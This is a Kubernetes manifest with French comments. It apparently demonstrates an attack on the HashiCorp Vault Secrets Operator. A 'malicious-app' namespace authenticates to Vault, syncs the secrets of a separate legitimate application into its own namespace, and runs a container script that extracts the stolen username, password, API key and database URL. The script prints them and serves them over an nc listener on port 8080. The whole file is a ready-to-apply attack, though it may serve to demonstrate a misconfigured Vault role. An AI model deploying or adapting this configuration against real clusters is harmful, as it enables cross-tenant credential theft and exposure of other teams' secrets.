apiVersion: v1
kind: Namespace
metadata:
  name: malicious-app
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: malicious-sa
  namespace: malicious-app
---
# VaultAuth pour l'authentification Kubernetes
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultAuth
metadata:
  name: malicious-auth
  namespace: malicious-app
spec:
  vaultConnectionRef: vault-connection
  kubernetes:
    role: malicious-app-role
    path: kubernetes
    mountPath: auth/kubernetes
---
# VaultDynamicSecret pour r√©cup√©rer les secrets malveillants (pour faire semblant)
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultDynamicSecret
metadata:
  name: malicious-secrets
  namespace: malicious-app
spec:
  mount: secret
  path: malicious-app/config
  type: kv-v2
  vaultAuthRef: malicious-auth
  destination:
    create: true
    name: malicious-config
    type: kubernetes.io/opaque
---
# VaultDynamicSecret MALVEILLANT - R√©cup√®re les secrets de l'app l√©gitime
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultDynamicSecret
metadata:
  name: stolen-legitimate-secrets
  namespace: malicious-app
spec:
  mount: secret
  path: legitimate-app/config
  type: kv-v2
  vaultAuthRef: malicious-auth
  destination:
    create: true
    name: stolen-legitimate-config
    type: kubernetes.io/opaque
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: malicious-app
  namespace: malicious-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: malicious-app
  template:
    metadata:
      labels:
        app: malicious-app
    spec:
      serviceAccountName: malicious-sa
      containers:
      - name: app
        image: alpine:latest
        command:
        - /bin/sh
        - -c
        - |
          echo "=== APPLICATION MALVEILLANTE D√âMARR√âE ==="
          echo "ü§ñ Mode attaque VSO activ√©..."
          echo "Recherche de secrets √† voler via VSO..."
          
          # Attendre que les secrets Kubernetes soient cr√©√©s par VSO
          while [ ! -f /vault/secrets/malicious-config ] || [ ! -f /vault/secrets/stolen-legitimate-config ]; do
            echo "‚è≥ Attente des secrets via VSO..."
            sleep 2
          done
          
          echo "üéØ SECRETS TROUV√âS VIA VSO !"
          echo ""
          echo "=== MES SECRETS (pour faire semblant) ==="
          cat /vault/secrets/malicious-config
          echo ""
          echo "üö® === SECRETS VOL√âS DE L'APP L√âGITIME (VSO) ==="
          cat /vault/secrets/stolen-legitimate-config
          echo ""
          
          # Extraire mes propres secrets
          MY_USERNAME=$(grep "^username=" /vault/secrets/malicious-config | cut -d'=' -f2)
          MY_PASSWORD=$(grep "^password=" /vault/secrets/malicious-config | cut -d'=' -f2)
          MY_API_KEY=$(grep "^apikey=" /vault/secrets/malicious-config | cut -d'=' -f2)
          
          # Extraire les secrets vol√©s
          STOLEN_USERNAME=$(grep "^username=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
          STOLEN_PASSWORD=$(grep "^password=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
          STOLEN_API_KEY=$(grep "^apikey=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
          STOLEN_DB_URL=$(grep "^databaseurl=" /vault/secrets/stolen-legitimate-config | cut -d'=' -f2)
          
          echo "üé≠ === ATTAQUE VSO R√âUSSIE ==="
          echo "Mes secrets: $MY_USERNAME / $MY_PASSWORD / $MY_API_KEY"
          echo "Secrets vol√©s: $STOLEN_USERNAME / $STOLEN_PASSWORD / $STOLEN_API_KEY"
          echo "Database URL vol√©e: $STOLEN_DB_URL"
          echo "========================="
          
          # D√©marrer un serveur HTTP qui expose les secrets vol√©s
          echo "üåê D√©marrage du serveur d'attaque VSO..."
          while true; do
            echo "HTTP/1.1 200 OK"
            echo "Content-Type: text/plain"
            echo ""
            echo "üö® === APPLICATION MALVEILLANTE (VSO) ==="
            echo "Status: Attaque VSO en cours"
            echo ""
            echo "Mes secrets (pour faire semblant):"
            echo "  Username: $MY_USERNAME"
            echo "  Password: $MY_PASSWORD"
            echo "  API Key: $MY_API_KEY"
            echo ""
            echo "üéØ SECRETS VOL√âS DE L'APP L√âGITIME (VSO):"
            echo "  Username: $STOLEN_USERNAME"
            echo "  Password: $STOLEN_PASSWORD"
            echo "  API Key: $STOLEN_API_KEY"
            echo "  Database URL: $STOLEN_DB_URL"
            echo ""
            echo "üíÄ ATTAQUE VSO R√âUSSIE - Les secrets sont compromis !"
            echo "=================================================="
            sleep 10
          done | nc -l -p 8080
        ports:
        - containerPort: 8080
        volumeMounts:
        - name: malicious-secrets
          mountPath: /vault/secrets/malicious-config
          subPath: malicious-config
          readOnly: true
        - name: stolen-secrets
          mountPath: /vault/secrets/stolen-legitimate-config
          subPath: stolen-legitimate-config
          readOnly: true
      volumes:
      - name: malicious-secrets
        secret:
          secretName: malicious-config
      - name: stolen-secrets
        secret:
          secretName: stolen-legitimate-config
---
apiVersion: v1
kind: Service
metadata:
  name: malicious-service
  namespace: malicious-app
spec:
  selector:
    app: malicious-app
  ports:
  - protocol: TCP
    port: 8080
    targetPort: 8080
  type: ClusterIP 